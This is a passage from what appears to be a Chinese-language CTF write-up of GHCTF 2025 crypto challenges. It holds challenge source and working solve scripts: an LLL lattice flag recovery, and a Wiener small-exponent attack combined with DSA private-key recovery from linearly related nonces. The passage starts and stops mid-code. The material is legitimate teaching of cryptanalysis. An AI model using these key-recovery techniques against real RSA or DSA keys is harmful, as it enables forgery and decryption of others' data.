class="number">2</span> - <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">17</span>*y^<span class="number">5</span> - x^<span class="number">16</span>*y^<span class="number">6</span> - x^<span class="number">15</span>*y^<span class="number">7</span> + <span class="number">4</span>*x^<span class="number">13</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">12</span> - x^<span class="number">9</span>*y^<span class="number">13</span> - x^<span class="number">7</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">19</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">20</span> + <span class="number">2</span>*x*y^<span class="number">21</span> + <span class="number">3</span>*y^<span class="number">22</span> - <span class="number">3</span>*x^<span class="number">21</span> - x^<span class="number">20</span>*y - x^<span class="number">19</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">4</span> - x^<span class="number">16</span>*y^<span class="number">5</span> - x^<span class="number">15</span>*y^<span class="number">6</span> + x^<span class="number">14</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">12</span>*y^<span class="number">9</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">10</span> + x^<span class="number">10</span>*y^<span class="number">11</span> + x^<span class="number">6</span>*y^<span class="number">15</span> + x^<span class="number">5</span>*y^<span class="number">16</span> + x^<span class="number">4</span>*y^<span class="number">17</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">19</span> - <span class="number">2</span>*x*y^<span class="number">20</span> - <span class="number">2</span>*y^<span class="number">21</span> + x^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">19</span>*y - <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">7</span> - x^<span class="number">12</span>*y^<span class="number">8</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">9</span> + x^<span class="number">10</span>*y^<span class="number">10</span> + <span class="number">6</span>*x^<span class="number">9</span>*y^<span class="number">11</span> + x^<span class="number">8</span>*y^<span class="number">12</span> + x^<span class="number">7</span>*y^<span class="number">13</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">15</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">17</span> - x^<span class="number">2</span>*y^<span class="number">18</span> + <span class="number">3</span>*x*y^<span class="number">19</span> - x^<span class="number">17</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">5</span> - x^<span class="number">13</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">8</span> + x^<span class="number">10</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">10</span> - x^<span class="number">7</span>*y^<span class="number">12</span> - x^<span class="number">6</span>*y^<span class="number">13</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">15</span> + x^<span class="number">2</span>*y^<span class="number">17</span> + <span class="number">2</span>*y^<span class="number">19</span> - x^<span class="number">18</span> - x^<span class="number">16</span>*y^<span class="number">2</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">10</span> + x^<span class="number">6</span>*y^<span class="number">12</span> - x^<span class="number">4</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">16</span> - <span class="number">2</span>*x*y^<span class="number">17</span> - x^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">16</span>*y - <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">3</span> - x^<span class="number">13</span>*y^<span class="number">4</span> + x^<span class="number">12</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">10</span>*y^<span class="number">7</span> - x^<span class="number">9</span>*y^<span class="number">8</span> - <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">11</span> - x^<span class="number">5</span>*y^<span class="number">12</span> + x^<span class="number">4</span>*y^<span class="number">13</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">15</span> + x*y^<span class="number">16</span> - <span class="number">3</span>*x^<span class="number">16</span> + x^<span class="number">15</span>*y - <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">2</span> - x^<span class="number">13</span>*y^<span class="number">3</span> - x^<span class="number">12</span>*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">5</span> - x^<span class="number">10</span>*y^<span class="number">6</span> + <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">7</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">11</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">13</span> + x^<span class="number">2</span>*y^<span class="number">14</span> - <span class="number">3</span>*x*y^<span class="number">15</span> - x^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">14</span>*y + x^<span class="number">13</span>*y^<span class="number">2</span> - x^<span class="number">12</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">4</span> + x^<span class="number">10</span>*y^<span class="number">5</span> - x^<span class="number">9</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">7</span> - x^<span class="number">7</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">4</span>*y^<span class="number">11</span> + x^<span class="number">3</span>*y^<span class="number">12</span> - x^<span class="number">14</span> + x^<span class="number">13</span>*y + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">2</span> + x^<span class="number">11</span>*y^<span class="number">3</span> - <span class="number">5</span>*x^<span class="number">10</span>*y^<span class="number">4</span> - x^<span class="number">9</span>*y^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">7</span> + x^<span class="number">6</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">9</span> + x^<span class="number">4</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">2</span>*y^<span class="number">12</span> - <span class="number">4</span>*x*y^<span class="number">13</span> + <span class="number">3</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">2</span> - x^<span class="number">9</span>*y^<span class="number">4</span> - x^<span class="number">8</span>*y^<span class="number">5</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">10</span> - x^<span class="number">2</span>*y^<span class="number">11</span> - <span class="number">2</span>*x*y^<span class="number">12</span> - <span class="number">3</span>*y^<span class="number">13</span> + <span class="number">3</span>*x^<span class="number">12</span> + x^<span class="number">11</span>*y + x^<span class="number">10</span>*y^<span class="number">2</span> + x^<span class="number">9</span>*y^<span class="number">3</span> + x^<span class="number">8</span>*y^<span class="number">4</span> - x^<span class="number">6</span>*y^<span class="number">6</span> - x^<span class="number">5</span>*y^<span class="number">7</span> - <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">9</span> - x^<span class="number">2</span>*y^<span class="number">10</span> - <span class="number">3</span>*x*y^<span class="number">11</span> - <span class="number">2</span>*y^<span class="number">12</span> + x^<span class="number">10</span>*y + <span class="number">5</span>*x^<span class="number">9</span>*y^<span class="number">2</span> + x^<span class="number">8</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">6</span> + x^<span class="number">4</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">9</span> + <span class="number">2</span>*x*y^<span class="number">10</span> + <span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">9</span>*y - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">3</span> - x^<span class="number">6</span>*y^<span class="number">4</span> + x^<span class="number">5</span>*y^<span class="number">5</span> + <span class="number">3</span>*x^<span class="number">4</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">8</span> - x*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">8</span>*y - <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">3</span> + x^<span class="number">5</span>*y^<span class="number">4</span> - x^<span class="number">4</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">7</span> + x*y^<span class="number">8</span> + <span class="number">4</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">8</span> - x^<span class="number">7</span>*y - <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">3</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">4</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">6</span> + <span class="number">2</span>*x*y^<span class="number">7</span> - <span class="number">2</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">2</span> + <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">5</span> - x*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span> + <span class="number">6</span>*x^<span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">4</span> - <span class="number">2</span>*x*y^<span class="number">5</span> - <span class="number">3</span>*y^<span class="number">6</span> + x^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">4</span>*y + x^<span class="number">3</span>*y^<span class="number">2</span> + x^<span class="number">2</span>*y^<span class="number">3</span> - <span class="number">2</span>*x*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">3</span>*y + <span class="number">6</span>*x^<span class="number">2</span>*y^<span class="number">2</span> - <span class="number">3</span>*x*y^<span class="number">3</span> - <span class="number">2</span>*y^<span class="number">4</span> - <span class="number">5</span>*x^<span class="number">3</span> - <span class="number">2</span>*x^<span class="number">2</span>*y - <span class="number">2</span>*x*y^<span class="number">2</span> + <span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span> - x*y + y^<span class="number">2</span> - <span class="number">2</span>*x + <span class="number">2</span>*y - <span class="number">2</span></span><br><span class="line">w = <span class="number">12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line">c = <span class="number">10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942</span></span><br><span class="line">need = [(-term[<span class="number">0</span>], term[<span class="number">1</span>].degree()) <span class="keyword">for</span> term <span class="keyword">in</span> f%(x-<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">sumpow = [<span class="number">4</span>] <span class="comment"># sumpow[i] = pow(2,p**i+q**i,n)</span></span><br><span class="line">sumpow.append(<span class="built_in">pow</span>(<span class="number">2</span>,n+<span class="number">1</span>,n)) <span class="comment"># (p*q + 1)%(p*q - p - q + 1) == p + q</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">32</span>):</span><br><span class="line">    sumpow.append(<span class="built_in">pow</span>(sumpow[i-<span class="number">1</span>],n+<span class="number">1</span>,n) * <span class="built_in">pow</span>(sumpow[i-<span class="number">2</span>],-n,n))</span><br><span class="line">    sumpow[-<span class="number">1</span>] %= n</span><br><span class="line">    <span class="comment"># p**i + q**i = (p + q)(p**(i-1) + q**(i-1)) - (p*q)(p**(i-2) + q**(i-2))</span></span><br><span class="line"></span><br><span class="line">f2 = f</span><br><span class="line">w2 = w</span><br><span class="line"><span class="keyword">for</span> coeff, deg <span class="keyword">in</span> need:</span><br><span class="line">    w2 *= <span class="built_in">pow</span>(sumpow[deg],coeff,n)</span><br><span class="line">    w2 %= n</span><br><span class="line">    f2 += coeff*(x**deg + y**deg)</span><br><span class="line"></span><br><span class="line">p = gcd(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(f2%(x-<span class="number">1</span>)),n) * <span class="built_in">pow</span>(w2,-<span class="number">1</span>,n) - <span class="number">1</span>, n)</span><br><span class="line">prefix = <span class="string">b&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">suffix = <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">length = <span class="number">88</span> - <span class="built_in">len</span>(prefix) - <span class="built_in">len</span>(suffix)</span><br><span class="line"></span><br><span class="line">c -= <span class="number">256</span>^(<span class="built_in">len</span>(suffix) + length) * bytes_to_long(prefix)</span><br><span class="line">c -= bytes_to_long(suffix)</span><br><span class="line">c = c * inverse(<span class="number">256</span>,p) % p</span><br><span class="line"></span><br><span class="line">L = Matrix(ZZ,length+<span class="number">2</span>,length+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    L[i,i] = <span class="number">1</span></span><br><span class="line">    L[i,-<span class="number">1</span>] = <span class="number">256</span>^i</span><br><span class="line">    c -= <span class="number">256</span>^i*<span class="number">48</span></span><br><span class="line"></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">4</span></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">1</span>] = -c</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = p</span><br><span class="line">L[:,-<span class="number">1</span>:] *= <span class="number">2</span>^<span class="number">512</span></span><br><span class="line">res = L.LLL()</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">abs</span>(i[-<span class="number">2</span>]) == <span class="number">4</span> <span class="keyword">and</span> <span class="built_in">all</span>(<span class="built_in">abs</span>(j) &lt; <span class="number">10</span> <span class="keyword">for</span> j <span class="keyword">in</span> i)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[:-<span class="number">2</span>][::-<span class="number">1</span>]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="number">48</span> + <span class="built_in">abs</span>(j))</span><br><span class="line">flag = prefix+flag.encode()+suffix</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h2 id="rsa_and_dsa"><a class="markdownIt-Anchor" href="#rsa_and_dsa"></a> RSA_and_DSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">ink=getPrime(<span class="number">20</span>)</span><br><span class="line">p1= getPrime(<span class="number">512</span>)</span><br><span class="line">q1= getPrime(<span class="number">512</span>)</span><br><span class="line">N = p1* q1</span><br><span class="line">phi = (p1-<span class="number">1</span>) * (q1-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d1= getRandomNBitInteger(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(d1, phi) == <span class="number">1</span>:</span><br><span class="line">        e = inverse(d1, phi)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">c_ink = <span class="built_in">pow</span>(ink, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_ink=&#x27;</span>,c_ink)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e=&#x27;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N=&#x27;</span>,N)</span><br><span class="line"></span><br><span class="line">k= getPrime(<span class="number">64</span>)</span><br><span class="line">q = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg, pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">pow</span>(g, k, p) % q)</span><br><span class="line">    h = <span class="built_in">int</span>(hashlib.sha256(msg).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    s = <span class="built_in">int</span>((h + x * r) * gmpy2.invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    temp = q * getrandbits(<span class="number">864</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(temp + <span class="number">1</span>):</span><br><span class="line">        p = temp + <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">assert</span> p % q == <span class="number">1</span></span><br><span class="line">h = randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">g = <span class="built_in">pow</span>(h, (p - <span class="number">1</span>) // q, p)</span><br><span class="line">y = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">pub = (p,q,g,y)</span><br><span class="line">pri = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r1,s1)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r2,s2)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k+ink))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;g= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y= &#125;</span>&quot;</span>)</span><br><span class="line">key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxxxx&#125;&quot;</span></span><br><span class="line">ciphertext = cipher.encrypt(pad(flag.encode(), <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ciphertext = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c_ink= 75517502692097831363443739147565176367247985201143975453326891807623085586665800338505194812511215986799510259417486636115714543892322380908775898968005967267154089356401466517827082639942650711458196552847137272733225451581167527549711435805194039361007506436462393605949663173972848316802086005675594122447</span></span><br><span class="line"><span class="string">e= 97127528017076464922170978933159739328499830874876612140194720448608536284451056980759925228574802703400503852897647806707933102198339936307176078592550748707182506634151382952065240918923594664309561466538540752851827183955776181255541306419282376724578231110985180090748520497985751591062886932254909959583</span></span><br><span class="line"><span class="string">N= 131342286566556880877092331187418465653855813425966929864425381510875531237549624989644814104311810243468058174748867544024292263674725375273146689145421426693384862215460097683187892351130513429928063652701077721570140977719823754701988835199434602294597102748436781125528389125846980183998136743830655746063</span></span><br><span class="line"><span class="string">(r1,s1)= (116607429176396769010327954525649019081679807573, 242024511677350537268048640408155954695100314686)</span></span><br><span class="line"><span class="string">(r2,s2)= (282969697665204582571637561594660002955972273916, 233488943967710383661411268886726155900968304282)</span></span><br><span class="line"><span class="string">g= 113752591438136097752416877421595518178059067044406008965947486693591255247711343925741016027611310257564826355221058212913879375956265361413159461801130112690842862767232535007802294944943540511148985219047761964228666223605898858379133610079745082176804146052086680551043775640630819062323009071190616231206</span></span><br><span class="line"><span class="string">q= 1010682595723348988315901923086844563134854720501</span></span><br><span class="line"><span class="string">p= 117574623402990360322255542120443410701206393780334500865748478770699335257408652117586356058603035930256320433146236288486738066821845146885689024168044244453298677322763816219621376364185484753693835156465778487436550070788009331605135011517651578548403565196930955818239577581944709384126001757349228062611</span></span><br><span class="line"><span class="string">y= 114719310327856435690312712426667059528255758467780345974417610618467568889317865434557927492426543544900066735337367408842750916882737134575812646864528120528284507025781167314123831868039617392195979751697057669675359335622753482920688147222344801914086866640706838774098397923450797553056502975678740968481</span></span><br><span class="line"><span class="string">ciphertext = b&#x27;\x10\xbcL|\xcb\xe5W\x1e0\xa3\x83\x85vr^SmU\xac\xe3L\x93&quot;#\xb4\x81\xd0\xf0S\x05\xb7\xc7&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>首先是<strong>维纳攻击</strong>，这个没什么好说的，直接套板子</p><p>然后是<strong>熟悉的DSA</strong>，去年的<strong>国城杯CTF</strong>也接触过一题，不过那题是<strong>关系k攻击(k2=k1^2)，<strong>这题是</strong>线性k攻击(k2=k1+ink)</strong>，还是参考的这篇<a href="http://www.cynthia99.link/index.php/archives/2426/">博客</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">h = <span class="built_in">int</span>(hashlib.sha256(<span class="string">b&#x27;GHCTF-2025&#x27;</span>).digest().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">c_ink = <span class="number">75517502692097831363443739147565176367247985201143975453326891807623085586665800338505194812511215986799510259417486636115714543892322380908775898968005967267154089356401466517827082639942650711458196552847137272733225451581167527549711435805194039361007506436462393605949663173972848316802086005675594122447</span></span><br><span class="line">e = <span class="number">97127528017076464922170978933159739328499830874876612140194720448608536284451056980759925228574802703400503852897647806707933102198339936307176078592550748707182506634151382952065240918923594664309561466538540752851827183955776181255541306419282376724578231110985180090748520497985751591062886932254909959583</span></span><br><span class="line">N = <span class="number">131342286566556880877092331187418465653855813425966929864425381510875531237549624989644814104311810243468058174748867544024292263674725375273146689145421426693384862215460097683187892351130513429928063652701077721570140977719823754701988835199434602294597102748436781125528389125846980183998136743830655746063</span></span><br><span class="line">(r1, s1) = (<span class="number">116607429176396769010327954525649019081679807573</span>,</span><br><span class="line">            <span class="number">242024511677350537268048640408155954695100314686</span>)</span><br><span class="line">(r2, s2) = (<span class="number">282969697665204582571637561594660002955972273916</span>,</span><br><span class="line">            <span class="number">233488943967710383661411268886726155900968304282</span>)</span><br><span class="line">g = <span class="number">113752591438136097752416877421595518178059067044406008965947486693591255247711343925741016027611310257564826355221058212913879375956265361413159461801130112690842862767232535007802294944943540511148985219047761964228666223605898858379133610079745082176804146052086680551043775640630819062323009071190616231206</span></span><br><span class="line">q = <span class="number">1010682595723348988315901923086844563134854720501</span></span><br><span class="line">p = <span class="number">117574623402990360322255542120443410701206393780334500865748478770699335257408652117586356058603035930256320433146236288486738066821845146885689024168044244453298677322763816219621376364185484753693835156465778487436550070788009331605135011517651578548403565196930955818239577581944709384126001757349228062611</span></span><br><span class="line">y = <span class="number">114719310327856435690312712426667059528255758467780345974417610618467568889317865434557927492426543544900066735337367408842750916882737134575812646864528120528284507025781167314123831868039617392195979751697057669675359335622753482920688147222344801914086866640706838774098397923450797553056502975678740968481</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x10\xbcL|\xcb\xe5W\x1e0\xa3\x83\x85vr^SmU\xac\xe3L\x93&quot;#\xb4\x81\xd0\xf0S\x05\xb7\xc7&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator = <span class="number">0</span>  <span class="comment"># 分子</span></span><br><span class="line">    denominator = <span class="number">1</span>  <span class="comment"># 分母</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    res = []</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> d.bit_length() == <span class="number">200</span>:</span><br><span class="line">            res.append(d)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = wienerAttack(e, N)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    ink = <span class="built_in">pow</span>(c_ink, i, N)</span><br><span class="line">    k = (h*r2 - h*r1 + ink*s2*r1) * inverse(s1*r2 - s2*r1, q) % q</span><br><span class="line">    pri = (k*s1 - h) * inverse(r1, q) % q</span><br><span class="line">    key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="sin"><a class="markdownIt-Anchor" href="#sin"></a> Sin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="built_in">print</span>((<span class="number">2</span> * sin((m := bytes_to_long(<span class="string">b&#x27;NSSCTF&#123;test_flag&#125;&#x27;</span>))) - <span class="number">2</span> * sin(m) * cos(<span class="number">2</span> * m)).n(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span 